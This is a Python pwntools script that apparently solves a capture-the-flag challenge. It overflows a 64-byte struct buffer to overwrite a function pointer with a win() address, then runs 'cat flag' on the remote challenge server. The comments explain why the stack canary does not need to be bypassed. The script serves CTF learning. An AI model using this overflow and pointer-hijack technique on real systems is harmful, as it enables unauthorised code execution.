from pwn import *

# From checksec:
# Stack:      Canary found  =>  we should bypass the stack canary to exploit the buffer overflow vulnerability
# PIE:        No PIE (0x400000)  =>  addresses are static and can be used directly in the exploit (e.g., win() function address)

conn = remote("offsec.m0lecon.it", 13542)

OFFSET_TO_FUNC_PTR = 64   # 64 is exactly the size of the buffer placed as the first field of the struct
win_addr = 0x4012a3

# NOTE: here the canary is NOT even touched, since it is sufficient to fill the buffer entirely
#       and overwrite the second field of the struct (which is a pointer) with the address of the win() function
conn.recvuntil(b"Whisper your incantation:\n")
payload = flat(
    b"A" * OFFSET_TO_FUNC_PTR,  # send enough bytes to completely fill the buffer
    p64(win_addr)               # overwrite the *cast pointer with the address of win()
)

conn.send(payload)

conn.sendline(b"cat flag")

conn.interactive()
